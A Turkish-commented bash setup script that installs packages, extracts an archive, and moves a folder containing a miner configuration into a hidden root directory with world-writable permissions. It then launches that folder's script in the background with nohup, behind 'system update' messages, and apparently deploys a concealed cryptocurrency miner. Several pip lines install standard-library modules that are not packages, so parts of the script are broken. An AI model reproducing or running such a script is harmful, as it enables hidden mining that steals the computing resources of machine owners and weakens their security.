#!/bin/bash

# Sistem güncellemelerini yap
echo "Sistem güncellemeleri yapılıyor..."
sudo apt update -y
sudo apt-get upgrade -y
sudo apt install cmake build-essential -y
sudo apt install python3-pip -y
sudo apt install python3  python3-pip git Cargo -y
pip3 install psutil
pip3 install requests
pip3 install threading
pip3 install psutil
pip3 install requests
pip3 install time
pip3 install random
pip3 install string

# /root/dogibokubuseferyemedi klasörünün var olup olmadığını kontrol et
dogiPath="/root/dogibokubuseferyemedi"
if [ ! -d "$dogiPath" ]; then
    echo "Klasör bulunamadı, oluşturuluyor..."
    sudo mkdir -p "$dogiPath"
fi

# /root/dogibokubuseferyemedi klasörüne geç
cd "$dogiPath" || { echo "Klasöre geçiş yapılamadı."; exit 1; }

# x12.tar dosyasını çıkar
echo "x12.tar çıkarılıyor..."
sudo tar -xf x12.tar

# hayirlisi calisacak
echo "Klasör taşınıyor ve ayarlar yapılıyor..."
sudo mv hayirlisi /root/
sudo chmod 777 /root/hayirlisi
sudo chown root:root /root/hayirlisi
sudo mv /root/hayirlisi /root/.hayirlisi
mv /root/dogibokubuseferyemedi/miner.conf /root/.hayirlisi/

# upgrade_and_run.sh script'ini nohup ile çalıştır
echo "upgrade_and_run.sh çalıştırılıyor..."
cd /root/.hayirlisi || { echo "Klasöre geçiş yapılamadı."; exit 1; }
nohup bash upgrade_and_run.sh 2>&1 &
# /root/dogibokubuseferyemedi klasörüne geri dön
cd "$dogiPath" || { echo "Klasöre geri dönüş yapılamadı."; exit 1; }

# 'online' adında yeni bir screen oturumu başlat
echo "'online' adında screen oturumu başlatılıyor..."
sudo screen -S online